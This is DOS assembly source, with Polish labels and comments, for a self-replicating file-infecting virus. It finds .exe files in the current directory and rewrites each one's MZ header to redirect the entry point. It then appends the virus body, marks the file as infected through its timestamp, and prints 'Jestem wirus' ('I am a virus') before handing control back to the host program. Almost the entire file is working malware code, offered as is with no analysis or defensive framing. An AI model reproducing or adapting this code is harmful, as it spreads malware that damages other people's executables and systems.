format mz
entry main:start
stack 100h

P21H_TEKST_$_WYPISZ equ 9h
P21H_P_BUFOR_ADRES_POBIERZ equ 2fh
P21H_P_DATA_CZAS_POBIERZ equ 5700h
P21H_DATA_CZAS_ZAPISZ equ 5701h
P21H_PLIK_SZUKAJ_MASKA equ 4eh
P21H_PLIK_SZUKAJ_NASTEPNEGO equ 4fh
P21H_PLIK_OTWORZ equ 3d02h
P21H_PLIK_ODCZYTAJ equ 3f00h
P21H_PLIK_ZAPISZ equ 4000h
P21H_PLIK_ZAMKNIJ equ 3eh
P21H_PLIK_WSKAZNIK_PRZESUN equ 4200h
P21H_PLIK_WSKAZNIK_POCZATEK equ 00h
P21H_PLIK_WSKAZNIK_KONIEC equ 02h
P21H_ZAMKNIJ equ 4c00h

PLIK_NAZWA_OFS equ 1eh
PLIK_ROZMIAR_OFS equ 4h
P_NAGLOWEK_ROZMIAR_OFS equ 8h
P_POCZATEK_SEGMENT_OFS equ 16h
P_POCZATEK_OFFSET_OFS equ 14h
PLIK_NAGLOWEK_DLUGOSC equ 20h
PLIK_TYP equ 'MZ'
ZARAZONY_MASKA equ 0ffh

segment main

tablica_partycji:

start:
  mov dx, cs
  mov ds, dx
  call wirus_poczatek
  mov ah, P21H_TEKST_$_WYPISZ
  mov dx, informacja
  int 21h
; oczekiwanie na wciśnięcie klawisza
  mov ah, 0h
  int 16h
  mov ax, P21H_ZAMKNIJ
  int 21h

; wykonywane po uruchomieniu programu
start_pliku:
  push ds
  push es
; miejsce na psoty
  mov dx, cs
  mov ds, dx
  mov ah, P21H_TEKST_$_WYPISZ
  mov dx, informacja
  int 21h
; skok do pierwotnego początku programu
  mov dx, cs
  mov ds, dx
  mov ax, [plik_poczatek_cs]
  mov bx, [plik_poczatek_ip]
  pop es
  pop ds
  mov cx, ds
  add ax, cx
  add ax, 10h
  push ax
  push bx
  retf

; zarażanie
wirus_poczatek:
  push ax
  push bx
  push cx
  push dx
  push ds
  push es
  pushf
  mov dx, cs
  mov ds, dx

  mov ah, P21H_PLIK_SZUKAJ_MASKA
  mov dx, plik_maska
  mov cx, 0fh
  int 21h
; jc - nie znaleziono
  jc zarazanie_koniec

plik_znaleziono:
  mov ah, P21H_P_BUFOR_ADRES_POBIERZ
  int 21h
  mov cx, es
  mov ds, cx
  mov dx, bx
  add dx, PLIK_NAZWA_OFS
  mov ax, P21H_PLIK_OTWORZ
  int 21h
  mov cx, cs
  mov ds, cx
  mov bx, ax
  mov [plik_uchwyt], ax
; sprawdzenie czy plik jest już zarażony
  mov ax, P21H_P_DATA_CZAS_POBIERZ
  int 21h
  cmp cl, ZARAZONY_MASKA
  jne do_zarazenia
  mov ah, P21H_PLIK_ZAMKNIJ
  int 21h
  mov ah, P21H_PLIK_SZUKAJ_NASTEPNEGO
  int 21h
  jnc plik_znaleziono
  jmp zarazanie_koniec
  
do_zarazenia:
  mov cl, ZARAZONY_MASKA
  mov [plik_data], dx
  mov [plik_czas], cx
; pobranie długości pliku
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_KONIEC)
  int 21h
  mov [plik_dlugosc_seg], dx
  mov [plik_dlugosc_ofs], ax
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_POCZATEK)
  int 21h
  mov dx, plik_bufor
  mov cx, PLIK_NAGLOWEK_DLUGOSC
  mov ax, P21H_PLIK_ODCZYTAJ
  int 21h
  cmp word [plik_bufor], PLIK_TYP
  jne plik_oznacz
; zapisanie nowego rozmiaru pliku
  mov ax, koniec
  mov cl, 9
  shr ax, cl
  and ax, 1ffh
  mov cx, ax
  mov ax, word [plik_bufor + PLIK_ROZMIAR_OFS]
  add ax, cx
  inc ax
  mov word [plik_bufor + PLIK_ROZMIAR_OFS], ax
; zapamiętanie rozmiaru nagłówka
  mov ax, word [plik_bufor + P_NAGLOWEK_ROZMIAR_OFS]
  mov [plik_naglowek], ax
; zapamiętanie segmentu pierwotnego początku programu
  mov ax, word [plik_bufor + P_POCZATEK_SEGMENT_OFS]
  mov [plik_poczatek_cs], ax
; sprawdzenie długości pliku, jeśli zbyt długi to rezygnacja
  mov ax, [plik_dlugosc_seg]
  cmp ax, 02h
  jg plik_oznacz
; zapisanie segmentu nowego początku programu
  mov cl, 0ch
  shl ax, cl
  and ax, 0f000h
  mov dx, ax
  mov ax, [plik_dlugosc_ofs]
  mov cl, 04h
  shr ax, cl
  and ax, 0fffh
  add ax, dx
  mov dx, [plik_naglowek]
  sub ax, dx
  inc ax
  mov word [plik_bufor + P_POCZATEK_SEGMENT_OFS], ax
; zapamiętanie offsetu pierwotnego początku programu
  mov ax, word [plik_bufor + P_POCZATEK_OFFSET_OFS]
  mov [plik_poczatek_ip], ax
; zapisanie offsetu nowego początku programu
  mov ax, start_pliku
  mov word [plik_bufor + P_POCZATEK_OFFSET_OFS], ax
; zapisanie uaktualnionego nagłówka pliku
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_POCZATEK)
  int 21h
  mov dx, plik_bufor
  mov cx, PLIK_NAGLOWEK_DLUGOSC
  mov ax, P21H_PLIK_ZAPISZ
  int 21h
; dopisanie wirusa na koniec pliku
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_KONIEC)
  int 21h
  mov ax, [plik_dlugosc_ofs]
  and ax, 000fh
  mov cx, 0fh
  cmp ax, 0
  je plik_dopisz_wirusa
  sub cx, ax
plik_dopisz_wirusa:
  inc cx
  mov dx, tablica_partycji
  mov ax, P21H_PLIK_ZAPISZ
  int 21h
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_KONIEC)
  int 21h
  mov dx, tablica_partycji
  mov ax, koniec
; wyrównanie długości pliku do 512
  mov cl, 9
  shr ax, cl
  inc ax
  shl ax, cl
  mov cx, ax
  mov ax, P21H_PLIK_ZAPISZ
  int 21h

plik_oznacz:
; oznaczenie pliku jako zarażony
  mov cx, [plik_czas]
  mov dx, [plik_data]
  mov ax, P21H_DATA_CZAS_ZAPISZ
  int 21h
  mov ah, P21H_PLIK_ZAMKNIJ
  int 21h
  
zarazanie_koniec:
  popf
  pop es
  pop ds
  pop dx
  pop cx
  pop bx
  pop ax
  ret

;segment dane
plik_poczatek_ip dw ?
plik_poczatek_cs dw ?
plik_maska db "*.exe", 0
plik_uchwyt dw ?
plik_data dw ?
plik_czas dw ?
plik_dlugosc_seg dw ?
plik_dlugosc_ofs dw ?
plik_bufor: times 200h db ?
plik_naglowek dw ?

informacja db "Jestem wirus ]:> $"

koniec:

